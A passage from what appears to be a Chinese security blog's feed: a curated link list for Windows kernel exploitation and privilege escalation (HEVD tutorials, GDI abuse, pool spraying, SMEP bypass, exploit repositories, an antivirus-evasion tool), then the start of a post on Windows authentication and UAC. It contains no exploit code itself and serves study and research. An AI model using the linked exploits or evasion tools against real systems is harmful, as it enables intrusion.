href="https://codemachine.com/articles/kernel_structures.html">English Blog</a></li></ul></li><li>【Windows 对象】<ul><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/sysinfo/object-categories">object categories</a></li><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/sysinfo/user-objects">user Object</a></li><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/sysinfo/gdi-objects">gdi Object</a></li><li><a href="https://docs.microsoft.com/zh-cn/windows/win32/sysinfo/kernel-objects?redirectedfrom=MSDN">kernel Object</a></li><li><a href="https://codemachine.com/articles/object_headers.html">Windows Object Header</a></li><li><a href="https://docs.microsoft.com/zh-cn/archive/blogs/ntdebugging/desktop-heap-overview">Windows Desktop Heap</a></li></ul></li></ul></li></ul><h3><span id="pnei-he-diao-shi-gong-ju">内核调试工具</span><a href="#pnei-he-diao-shi-gong-ju" class="header-anchor">#</a></h3><ul><li>【Windbg】：windows kernel调试工具<ul><li><a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools">download</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/getting-started-with-windows-debugging">getting-started-with-windows-debugging</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/getting-started-with-windbg">Getting Started with WinDbg (User-Mode)</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/getting-started-with-windbg--kernel-mode-">Getting Started with WinDbg (Kernel-Mode)</a></li><li><a href="https://laptrinhx.com/my-personal-cheat-sheet-for-using-windbg-for-kernel-debugging-1997973673/">my-personal-cheat-sheet-for-using-windbg-for-kernel-debugging</a></li><li><a href="https://blog.csdn.net/forchoosen/article/details/107441660">Windbg加载用户层、内核层pdb文件</a></li></ul></li><li>【Windbg Preview】：windows kernel调试工具(美观)<ul><li><a href="https://www.microsoft.com/en-us/p/windbg-preview/">download</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugging-using-windbg-preview">Debugging Using WinDbg Preview</a></li></ul></li><li>【dbgview】：windows调试工具，捕获调试信息，用于Guest<ul><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/debugview">download</a></li><li><a href="https://documentation.help/DebugView/">Document help DebugView</a></li><li><a href="http://nutsaboutnets.com/faqs/dbgview/">Using DbgView To Capture Debug Traces From An Application</a></li><li><a href="https://tedgustaf.com/blog/2011/use-debugview-to-view-debug-output-from-asp-net-web-application/">Using DebugView to see debug output in real-time</a></li></ul></li><li>【OSRLoader】：驱动管理工具（安装，启动，暂停，卸载）<ul><li><a href="https://www.osronline.com/article.cfm%5earticle=157.htm">download</a></li></ul></li><li>【VirtualKD】：双机调试工具，较老，不支持最新版VMWare<ul><li><a href="https://sysprogs.com/legacy/virtualkd/">download</a></li></ul></li><li>【VirtualKD-Redux】：双机调试工具，支持最新版本VMWare<ul><li><a href="https://github.com/4d61726b/VirtualKD-Redux">download</a></li></ul></li></ul><h3><span id="phevd-nei-he-li-yong-jiao-cheng">HEVD 内核利用教程</span><a href="#phevd-nei-he-li-yong-jiao-cheng" class="header-anchor">#</a></h3><ul><li>【HackSysExtremeVulnerableDriver】：windows内核利用技术学习项目<ul><li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">download</a></li></ul></li><li>【HEVD StackOverflow】：<ul><li><a href="https://bbs.pediy.com/thread-252775.htm">HEVD内核漏洞之栈溢出</a></li><li><a href="https://50u1w4y.github.io/site/HEVD/stackoverflow/">HEVD栈溢出</a></li><li><a href="https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/">Windows Kernel Exploitation Tutorial Part 2: Stack Overflow</a></li></ul></li><li>【HEVD ArbitraryWrite】：<ul><li><a href="https://bbs.pediy.com/thread-253848.htm">HEVD内核漏洞之任意地址覆盖</a></li><li><a href="https://50u1w4y.github.io/site/HEVD/arbitraryWrite/">HEVD 任意地址覆盖</a></li><li><a href="https://bbs.pediy.com/thread-252506.htm">Windows Kernel Exploit 内核漏洞学习(3)-任意内存覆盖漏洞</a></li><li><a href="https://rootkits.xyz/blog/2017/09/kernel-write-what-where/">Windows Kernel Exploitation Tutorial Part 3: Arbitrary Memory Overwrite (Write-What-Where)</a></li></ul></li><li>【HEVD ArbitrayWrite BitMap】:<ul><li><a href="https://50u1w4y.github.io/site/HEVD/bitmap">bitmap 任意地址写漏洞利用</a></li><li><a href="https://paper.seebug.org/876/">Windows Kernel Exploit Part 5</a></li></ul></li><li>【Writeup综合】<ul><li><a href="https://thunderjie.github.io/2019/08/19/www%E6%BC%8F%E6%B4%9E%E4%BB%8Ewin7-win10/">www漏洞从win7-win10</a></li><li><a href="https://thunderjie.github.io/2019/06/28/Windows-Kernel-Exploit/">thunderjie 的 writeup</a></li><li><a href="https://50u1w4y.github.io/site/HEVD/homePage/">50u1w4y 的 writeup</a></li><li><a href="https://bbs.pediy.com/user-831334.htm">Saturn35 的 writeup</a></li><li><a href="https://rootkits.xyz/blog/">rootkit 的 writeup</a></li><li><a href="https://bbs.pediy.com/user-home-825245.htm">Thunder J 的 writeup</a></li><li><a href="https://www.fuzzysecurity.com/tutorials.html">fuzzing security 的 writeup</a></li></ul></li><li>【Exp综合】<ul><li><a href="https://github.com/h0mbre/Windows-Exploits/tree/162dfd45d284556b47739835116a962177b243b0/Exploit-Code/HEVD">https://github.com/h0mbre/Windows-Exploits/tree/162dfd45d284556b47739835116a962177b243b0/Exploit-Code/HEVD</a></li><li><a href="https://github.com/GradiusX/HEVD-Python-Solutions">https://github.com/GradiusX/HEVD-Python-Solutions</a></li><li><a href="https://github.com/dhn/OSEE/tree/master/Kernel_Exploitation/HEVD">https://github.com/dhn/OSEE/tree/master/Kernel_Exploitation/HEVD</a></li><li><a href="https://github.com/ThunderJie/Windows-Kernel-Exploit">https://github.com/ThunderJie/Windows-Kernel-Exploit</a></li></ul></li></ul><h3><span id="ptoken-quan-xian-lan-yong">token 权限滥用</span><a href="#ptoken-quan-xian-lan-yong" class="header-anchor">#</a></h3><ul><li>【windows-privilege-abuse-auditing-detection-and-defense】：windows token利用<ul><li><a href="https://medium.com/palantir/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e">English Blog</a></li></ul></li><li>【Abusing Token Privileges For EoP】：windows token权限滥用利用文章（含代码）<ul><li><a href="https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt">Paper</a></li><li><a href="https://github.com/hatRiot/token-priv">Code</a></li></ul></li><li>【windows-privileges】<ul><li>[English pdf][<a href="https://speakerdeck.com/fr0gger/windows-privileges">https://speakerdeck.com/fr0gger/windows-privileges</a>]</li></ul></li><li>【Priv2Admin：在 Windows 中利用漏洞提权】<ul><li><a href="https://github.com/gtworek/Priv2Admin">download</a></li></ul></li><li>【Potato家族本地提权细节】<ul><li><a href="https://xz.aliyun.com/t/7776">中文博客</a></li></ul></li></ul><h3><span id="pgdi-lan-yong-ti-quan">GDI 滥用提权</span><a href="#pgdi-lan-yong-ti-quan" class="header-anchor">#</a></h3><blockquote><p>内核利用从任意地址写 转换为 任意地址读写</p></blockquote><h4><span id="pbitmap-rs1-v1607-qian">BitMap RS1(v1607)前</span><a href="#pbitmap-rs1-v1607-qian" class="header-anchor">#</a></h4><ul><li>【Windows GDI BitMap】<ul><li><a href="https://kernel32.org/posts/windows-gdi-bitmap/">中文博客</a></li><li><a href="https://www.fuzzysecurity.com/tutorials/expDev/21.html">English Blog</a></li></ul></li><li>【Bitmap轶事：Windows 10纪念版后的GDI对象泄露】<ul><li><a href="https://r00tk1ts.github.io/2018/03/21/Bitmaps%E8%BD%B6%E4%BA%8B%EF%BC%9AWindows%2010%E7%BA%AA%E5%BF%B5%E7%89%88%E5%89%8D%E7%9A%84GDI%E5%AF%B9%E8%B1%A1%E6%B3%84%E9%9C%B2/">中文博客</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/">English Blog</a></li></ul></li><li>【Abusing GDI objects: Bitmap object’s size in the kernel pool】<ul><li><a href="http://theevilbit.blogspot.com/2017/10/abusing-gdi-objects-bitmap-objects-size.html">English Blog</a></li></ul></li><li>【ring0层exp原语之滥用GDI】<ul><li><a href="https://r00tk1ts.github.io/2018/01/15/ring0%E5%B1%82exp%E5%8E%9F%E8%AF%AD%E4%B9%8B%E6%BB%A5%E7%94%A8GDI/">中文博客</a></li></ul></li></ul><h4><span id="paccelerator-table-rs1-v1607">Accelerator Table RS1(v1607)</span><a href="#paccelerator-table-rs1-v1607" class="header-anchor">#</a></h4><ul><li>【RS1 下 bitmap 的替代方法】<ul><li><a href="https://50u1w4y.github.io/site/HEVD/bitmapReplace_RS1/">中文博客</a></li></ul></li><li>【Windows10 v1607内核提权技术的发展——利用AcceleratorTable】<ul><li><a href="https://www.anquanke.com/post/id/168356">中文博客</a></li></ul></li></ul><h4><span id="plpszmenuname-rs2-v1703">lpszMenuName RS2(v1703)</span><a href="#plpszmenuname-rs2-v1703" class="header-anchor">#</a></h4><ul><li>【Windows10 v1703基于桌面堆泄露的内核提权技术】<ul><li><a href="https://www.anquanke.com/post/id/168441">中文博客</a></li></ul></li><li>【Part 18: Kernel Exploitation -&gt; RS2 Bitmap Necromancy】<ul><li><a href="http://fuzzysecurity.com/tutorials/expDev/22.html">English Blog</a></li><li><a href="https://bbs.pediy.com/thread-225296.htm">中文博客</a></li></ul></li></ul><h4><span id="ppalette-rs3-v1709">Palette RS3 (v1709)</span><a href="#ppalette-rs3-v1709" class="header-anchor">#</a></h4><ul><li>【Windows10 v1709特权提升：GDI Palette滥用】<ul><li><a href="https://www.anquanke.com/post/id/168572">中文博客</a></li></ul></li></ul><h4><span id="pzong-shu">综述</span><a href="#pzong-shu" class="header-anchor">#</a></h4><ul><li>【GDI魔术:漏洞利用中的利器】<ul><li><a href="http://www.vxjump.net/files/seccon/exp-in-gdi.pdf">中文pdf</a></li></ul></li><li>【Abusing GDI for ring0 exploit primitives:Reloaded】<ul><li><a href="https://www.coresecurity.com/sites/default/files/private-files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf">English pdf</a></li></ul></li><li>【Abusing GDI for ring0 exploit primitives: Evolution】<ul><li><a href="https://labs.bluefrostsecurity.de/files/Abusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf">English Blog</a></li></ul></li><li>【滥用GDI对象】<ul><li><a href="https://saturn35.com/2019/07/25/20190725-1/">中文博客</a></li></ul></li><li>【www漏洞从win7-win10】<ul><li><a href="https://thunderjie.github.io/2019/08/19/www%E6%BC%8F%E6%B4%9E%E4%BB%8Ewin7-win10/">中文博客</a></li></ul></li><li>【Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level–Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp】<ul><li><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf">English pdf</a></li><li><a href="https://bbs.pediy.com/thread-227102.htm">中文 pdf</a></li></ul></li></ul><h3><span id="pdui-li-yong">堆利用</span><a href="#pdui-li-yong" class="header-anchor">#</a></h3><ul><li>【Windows内核池喷射的乐趣】<ul><li><a href="https://www.anquanke.com/post/id/86896">中文博客</a></li><li><a href="https://theevilbit.blogspot.com/2017/09/pool-spraying-fun-part-1.html">English Blog</a></li></ul></li><li>【Windows kernel pool spraying fun - Part 1 - Determine kernel object size】<ul><li><a href="https://theevilbit.blogspot.com/2017/09/pool-spraying-fun-part-1.html">English Blog</a></li></ul></li><li>【Windows kernel pool spraying fun - Part 2 - More objects】<ul><li><a href="https://theevilbit.blogspot.com/2017/09/windows-kernel-pool-spraying-fun-part-2.html">English Blog</a></li></ul></li><li>【Windows kernel pool spraying fun - Part 3 - Let’s make holes】<ul><li><a href="https://theevilbit.blogspot.com/2017/09/windows-kernel-pool-spraying-fun-part-3.html">English Blog</a></li></ul></li><li>【Windows kernel pool spraying fun - Part 4 - object &amp; pool headers, kex &amp; putting it all together】<ul><li><a href="https://theevilbit.blogspot.com/2017/09/windows-kernel-pool-spraying-fun-part-4.html">English Blog</a></li></ul></li><li>【Kernel Pool Exploitation on Windows 7】<ul><li><a href="https://www.exploit-db.com/docs/english/16032-kernel-pool-exploitation-on-windows-7.pdf">English paper</a></li></ul></li></ul><h3><span id="pbao-hu-rao-guo">保护绕过</span><a href="#pbao-hu-rao-guo" class="header-anchor">#</a></h3><ul><li>【SMEP和SMAP绕过】<ul><li><a href="https://bbs.pediy.com/thread-261744.htm">中文博客</a></li></ul></li><li>【Windows 10 x64上令牌窃取有效载荷问题，并绕过SMEP 上】<ul><li><a href="https://www.4hou.com/posts/21y1">中文博客</a></li></ul></li><li>【Windows 10 x64上令牌窃取有效载荷问题，并绕过SMEP 下】<ul><li><a href="https://www.4hou.com/posts/4YAV">中文博客</a></li></ul></li><li>【Windows SMEP Bypass U=S】<ul><li><a href="https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf">English pdf</a></li></ul></li></ul><h3><span id="ppayload">Payload</span><a href="#ppayload" class="header-anchor">#</a></h3><ul><li>【Attack Detection Fundamentals 2021 Windows Lab #1：构建一个可以绕过最常见保护机制的原始 payload】<ul><li><a href="https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-1/">English Blog</a></li></ul></li><li>【Attack Detection Fundamentals 2021 Windows Lab #2 ：引入其它绕过防御的技术优化 payload】<ul><li><a href="https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-2/">English Blog</a></li></ul></li><li>【Attack Detection Fundamentals 2021 Windows Lab #3：借助 API HOOK 针对使用远程桌面连接的用户劫持纯文本凭据】<ul><li><a href="https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-3/">English Blog</a></li></ul></li><li>【Attack Detection Fundamentals 2021 Windows Lab #4：窃取目标用户的 Chrome 浏览器中的 cookie，并探索如何检测这类可疑的劫持行为】<ul><li><a href="https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-4/">English Blog</a></li></ul></li></ul><h3><span id="pzong-shu">综述</span><a href="#pzong-shu" class="header-anchor">#</a></h3><ul><li>【猫鼠游戏：Windows内核提权样本狩猎思路分享】<ul><li><a href="https://www.anquanke.com/post/id/235716">中文博客</a></li></ul></li><li>【Windows Kernel Address Leaks】<ul><li><a href="https://github.com/sam-b/windows_kernel_address_leaks">Code</a></li></ul></li><li>【通过内核地址保护措施，回顾Windows安全加固技术】<ul><li><a href="https://www.anquanke.com/post/id/85614">中文博客</a></li></ul></li><li>【关于内核漏洞的原理分析】<ul><li><a href="https://www.yuque.com/posec/public/sp9bs1">中文博客</a></li></ul></li><li>【Level Up! Practical Windows Privilege Escalation - Andrew Smith】<ul><li><a href="https://www.youtube.com/watch?v=PC_iMqiuIRQ">Youtube</a></li></ul></li><li>【I Got 99 Problem But a Kernel Pointer Ain’t One】<ul><li><a href="https://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain't%20one.pdf">English pdf</a></li></ul></li><li>【The Life And Death of Kernel Object Abuse】<ul><li><a href="https://conference.hitb.org/hitbsecconf2018ams/materials/D1%20COMMSEC%20-%20Saif%20Elsherei%20and%20Ian%20Kronquist%20-%20The%20Life%20&amp;%20Death%20of%20Kernel%20Object%20Abuse.pdf">English pdf</a></li></ul></li><li>【A Window into Ring0】<ul><li><a href="https://labs.f-secure.com/assets/BlogFiles/mwri-steelcon-2017-samdb-a-window-into-ring0.pdf">English pdf</a></li></ul></li><li>【Easy local Windows Kernel exploitation】<ul><li><a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2012/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf">English pdf</a></li></ul></li></ul><h2><span id="pwindows-lou-dong-fen-xi">Windows 漏洞分析</span><a href="#pwindows-lou-dong-fen-xi" class="header-anchor">#</a></h2><h3><span id="pwindows-bu-ding">Windows 补丁</span><a href="#pwindows-bu-ding" class="header-anchor">#</a></h3><ul><li><a href="https://msrc.microsoft.com/update-guide/%EF%BC%9A%E5%AE%98%E6%96%B9KB%E5%AF%B9%E5%BA%94%E8%A1%A5%E4%B8%81%E4%BF%A1%E6%81%AF">https://msrc.microsoft.com/update-guide/：官方KB对应补丁信息</a></li><li><a href="https://bugs.hacking8.com/tiquan/%EF%BC%9A%E6%A0%B9%E6%8D%AEKB%E8%A1%A5%E4%B8%81%E5%8F%B7%E6%88%96%E8%80%85systeminfo%E6%9F%A5%E6%89%BE%E5%AF%B9%E5%BA%94%E7%9A%84exp">https://bugs.hacking8.com/tiquan/：根据KB补丁号或者systeminfo查找对应的exp</a></li><li>【Extracting and Diffing Windows Patches in 2020】： 通过Windows更新提取和分析补丁（含代码）<ul><li><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">English Blog</a></li></ul></li></ul><h3><span id="pwindows-lou-dong-ji-he">Windows 漏洞集合</span><a href="#pwindows-lou-dong-ji-he" class="header-anchor">#</a></h3><ul><li><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li><li><a href="https://github.com/nu11secur1ty/Windows10Exploits">https://github.com/nu11secur1ty/Windows10Exploits</a></li><li><a href="https://github.com/abatchy17/WindowsExploits">https://github.com/abatchy17/WindowsExploits</a></li><li><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></li><li><a href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a></li><li><a href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation">https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation</a></li><li><a href="https://github.com/Al1ex/WindowsElevation">https://github.com/Al1ex/WindowsElevation</a></li><li><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></li></ul><h3><span id="pcve-lou-dong-fen-xi">CVE漏洞分析</span><a href="#pcve-lou-dong-fen-xi" class="header-anchor">#</a></h3><h4><span id="pcve-2020-0787-bits-ren-yi-wen-jian-yi-dong-lou-dong">CVE-2020-0787 BITS任意文件移动漏洞</span><a href="#pcve-2020-0787-bits-ren-yi-wen-jian-yi-dong-lou-dong" class="header-anchor">#</a></h4><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal</a></li><li><a href="https://xz.aliyun.com/t/7935">https://xz.aliyun.com/t/7935</a></li><li><a href="https://itm4n.github.io/cve-2020-0787-windows-bits-eop/">https://itm4n.github.io/cve-2020-0787-windows-bits-eop/</a></li><li><a href="https://github.com/itm4n/BitsArbitraryFileMove">https://github.com/itm4n/BitsArbitraryFileMove</a></li><li><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION</a></li><li><a href="https://packetstormsecurity.com/files/158056/Background-Intelligent-Transfer-Service-Privilege-Escalation.html">https://packetstormsecurity.com/files/158056/Background-Intelligent-Transfer-Service-Privilege-Escalation.html</a></li><li><a href="https://blog.ycdxsb.cn/57177eae.html">https://blog.ycdxsb.cn/57177eae.html</a></li></ul><h4><span id="pcve-2020-0796-smb-ghost-zheng-shu-yi-chu-lou-dong">CVE-2020-0796 SMB Ghost 整数溢出漏洞</span><a href="#pcve-2020-0796-smb-ghost-zheng-shu-yi-chu-lou-dong" class="header-anchor">#</a></h4><ul><li><a href="https://jcxp.github.io/2020/03/31/CVE-2020-0796-SMB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://jcxp.github.io/2020/03/31/CVE-2020-0796-SMB漏洞分析/</a></li><li><a href="https://github.com/danigargu/CVE-2020-0796/blob/master/cve-2020-0796-local/exploit.cpp">https://github.com/danigargu/CVE-2020-0796/blob/master/cve-2020-0796-local/exploit.cpp</a></li><li><a href="https://paper.seebug.org/1168/">https://paper.seebug.org/1168/</a></li><li><a href="https://blog.ycdxsb.cn/6ba048bc.html">https://blog.ycdxsb.cn/6ba048bc.html</a></li></ul><h3><span id="pwindows-fen-xi-gong-ju">Windows 分析工具</span><a href="#pwindows-fen-xi-gong-ju" class="header-anchor">#</a></h3><ul><li>【accesschk】<ul><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">download</a></li></ul></li><li>【oleview】<ul><li><a href="https://github.com/tyranid/oleviewdotnet">download</a></li></ul></li><li>【process monitor】<ul><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">download</a></li></ul></li><li>【Windows-Kernel-Explorer】<ul><li><a href="https://github.com/AxtMueller/Windows-Kernel-Explorer/">download</a></li></ul></li><li>【sandbox-attacksurface-analysis-tools】<ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools">download</a></li></ul></li><li>【SystemExplorer】<ul><li><a href="https://github.com/zodiacon/SystemExplorer">download</a></li></ul></li><li>【ProcessHacker】<ul><li><a href="https://processhacker.sourceforge.io/downloads.php">download</a></li></ul></li><li>【drmemory】<ul><li><a href="https://github.com/DynamoRIO/drmemory">download</a></li></ul></li></ul><h2><span id="pwindows-shen-tou-ce-shi">Windows 渗透测试</span><a href="#pwindows-shen-tou-ce-shi" class="header-anchor">#</a></h2><h3><span id="pgong-ji-mian-fen-xi">攻击面分析</span><a href="#pgong-ji-mian-fen-xi" class="header-anchor">#</a></h3><ul><li>【揭秘 Windows 减少攻击面（ASR：attack surface reduction）的细节】<ul><li><a href="https://github.com/commial/experiments/tree/master/windows-defender/ASR">English Blog</a></li></ul></li></ul><h3><span id="pshen-tou-ce-shi-gong-ju">渗透测试工具</span><a href="#pshen-tou-ce-shi-gong-ju" class="header-anchor">#</a></h3><ul><li>【WADComs】：一个CheatSheet工具，包含精选的攻击性安全工具及其各自的命令列表<ul><li><a href="https://github.com/WADComs/WADComs.github.io">download</a></li></ul></li><li>【openark】：一款Windows平台上的开源Ark工具. Ark是Anti-Rootkit（对抗恶意程序）的简写, OpenArk目标成为逆向工程师、编程人员的工具，同时也能为那些希望清理恶意软件的用户服务<ul><li><a href="https://github.com/BlackINT3/OpenArk">download</a></li></ul></li><li>【FourEye】：exe、shellcode免杀<ul><li><a href="https://github.com/lengjibo/FourEye">download</a></li></ul></li></ul><h3><span id="pshen-tou-ce-shi-chang-yong-lou-dong">渗透测试常用漏洞</span><a href="#pshen-tou-ce-shi-chang-yong-lou-dong" class="header-anchor">#</a></h3><h4><span id="pms17-010-yong-heng-zhi-lan">MS17-010 永恒之蓝</span><a href="#pms17-010-yong-heng-zhi-lan" class="header-anchor">#</a></h4><ul><li><a href="http://oddboy.cn/2017/ms17-010-python%E8%84%9A%E6%9C%ACexploit/">http://oddboy.cn/2017/ms17-010-python脚本exploit/</a></li><li><a href="https://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/">https://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/</a></li><li><a href="https://github.com/SEC-GO/Red-vs-Blue/blob/master/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dms17-010%E7%9A%84%E5%88%A9%E7%94%A8.md">https://github.com/SEC-GO/Red-vs-Blue/blob/master/永恒之蓝ms17-010的利用.md</a></li><li><a href="https://blog.ycdxsb.cn/24e83041.html">https://blog.ycdxsb.cn/24e83041.html</a></li></ul><h3><span id="pzong-shu">综述</span><a href="#pzong-shu" class="header-anchor">#</a></h3><ul><li>【Windows 提权总结】<ul><li><a href="https://www.cnblogs.com/-mo-/p/12718115.html">中文博客</a></li></ul></li></ul><h2><span id="ppaper">Paper</span><a href="#ppaper" class="header-anchor">#</a></h2><ul><li>【Bugs on the Windshield: Fuzzing the Windows Kernel】：Windows kernel fuzz<ul><li><a href="https://research.checkpoint.com/2020/bugs-on-the-windshield-fuzzing-the-windows-kernel/">English Blog</a></li><li><a href="https://github.com/yoava333/presentations/blob/master/Fuzzing%20the%20Windows%20Kernel%20-%20OffensiveCon%202020.pdf">Paper</a></li></ul></li><li>【NTFUZZ: Enabling Type-Aware Kernel Fuzzing on Windows with Static Binary Analysis(S&amp; P 2021)】：Windows kernel Fuzz</li></ul><h2><span id="pzong-he-xing-zi-yuan">综合性资源</span><a href="#pzong-he-xing-zi-yuan" class="header-anchor">#</a></h2><ul><li><a href="https://labs.f-secure.com">https://labs.f-secure.com</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io:%E6%9C%89%E5%BE%88%E5%A4%9A%E4%BB%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%A7%92%E5%BA%A6%E5%AE%A1%E8%A7%86%E7%9A%84Windows%E4%B8%8B%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95">https://3gstudent.github.io/3gstudent.github.io:有很多从渗透测试角度审视的Windows下提权方法</a></li><li><a href="https://github.com/3gstudent/Pentest-and-Development-Tips:%E5%88%97%E4%B8%BE%E4%BA%86Windows%E4%B8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84Tips">https://github.com/3gstudent/Pentest-and-Development-Tips:列举了Windows下渗透测试的Tips</a></li><li><a href="https://r00tk1ts.github.io/tags/windows-kernel/">https://r00tk1ts.github.io/tags/windows-kernel/</a></li><li><a href="https://guide.offsecnewbie.com">https://guide.offsecnewbie.com</a>: 见过的最全面的总结</li><li><a href="https://github.com/ExpLife0011/awesome-windows-kernel-security-development">https://github.com/ExpLife0011/awesome-windows-kernel-security-development</a></li><li><a href="https://github.com/sam-b/windows_kernel_resources">https://github.com/sam-b/windows_kernel_resources</a></li><li><a href="https://github.com/itm4n%EF%BC%9Aitm4n%E5%A4%A7%E4%BD%AC%EF%BC%8C%E6%9C%89%E5%BE%88%E5%A4%9Awindows%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%8D%9A%E5%AE%A2%E9%87%8C%E4%B9%9F%E6%9C%89%E5%BE%88%E5%A4%9A%E5%B9%B2%E8%B4%A7">https://github.com/itm4n：itm4n大佬，有很多windows分析工具，博客里也有很多干货</a></li><li><a href="https://github.com/sailay1996/awesome_windows_logical_bugs">https://github.com/sailay1996/awesome_windows_logical_bugs</a></li><li><a href="https://github.com/topics/windows-privilege-escalation">https://github.com/topics/windows-privilege-escalation</a></li><li><a href="http://www.fuzzysecurity.com">http://www.fuzzysecurity.com</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>windows权限管理机制</title>
    <url>/e2c44604.html</url>
    <content><![CDATA[<blockquote><p>Windows 通过相互关联的<strong>身份验证</strong>和<strong>授权机制</strong>来控制<strong>系统资源</strong>和<strong>网络资源</strong>的使用。 对用户进行身份验证后，Windows 操作系统使用内置<strong>授权和访问控制技术</strong>来实现保护资源的第二阶段：确定经过身份验证的用户是否具有访问资源的正确权限。</p></blockquote><a id="more"></a><h3><span id="pji-ben-gai-nian">基本概念</span><a href="#pji-ben-gai-nian" class="header-anchor">#</a></h3><ul><li><p>对象：包括文件、文件夹、打印机、注册表项和 Active Directory 域服务 (AD DS) 对象</p></li><li><p>权限：授予用户或组的访问权限类型，例如，可以授予 Finance 组对名为 Payroll.dat 的文件的读取和写入权限。</p></li><li><p>对象所有权：创建对象时，会向该对象分配所有者。 默认情况下，所有者是对象的创建者。 无论对对象设置了哪些权限，该对象的所有者始终都可以更改权限。</p></li><li><p>权限继承：继承允许管理员轻松分配和管理权限， 例如，文件夹中的文件继承文件夹的权限</p></li><li><p>用户权限：向计算环境中的用户和组授予的特定权限和登录权限，管理员可以将特定权限分配给组帐户或单个用户帐户</p></li><li><p>动态访问控制：如果用户的作业或角色发生更改，则用户的权限会动态更改</p></li></ul><h3><span id="pren-zheng-ji-zhi">认证机制</span><a href="#pren-zheng-ji-zhi" class="header-anchor">#</a></h3><p>操作系统密码存储于<code>%SystemRoot%\system32\config\SAM</code>文件中</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031006.jpg" alt="image-20210222211129137"></p><p>在登录时，winlogon.exe接收到账号密码后，会将密码交给lsass进程，这个进程会将明文密码加密成NTLM Hash，与SAM文件中的账号密码进行比较认证</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031012.jpg" alt="image-20210222231126936" style="zoom:50%"><h3><span id="pyong-hu-zhang-hu-kong-zhi">用户账户控制</span><a href="#pyong-hu-zhang-hu-kong-zhi" class="header-anchor">#</a></h3><p><strong>Windows账户分类</strong>：</p><ul><li><p>SYSTEM：拥有系统最高权限</p></li><li><p>Administrators 用户组：</p><ul><li>Administrator</li><li>管理员账户：比SYSTEM低，是用户最高权限，在权限上与Administrator一样，但是在访问令牌管理上有所不同</li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031107.gif" alt="uac windows 登录过程"></p></li><li><p>Users 用户组</p><ul><li>标准账户</li></ul></li></ul><p><strong>显式的区别Administrator/管理员账户/标准账户</strong>：</p><ul><li>Administrator：可直接运行高权限程序，无弹窗</li><li>管理员账户：在运行高权限程序时，有弹窗确认</li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031137.jpg" alt="UAC 弹窗"></p><ul><li><p>标准账户：要求输入管理员账号和密码</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031144.jpg" alt="UAC 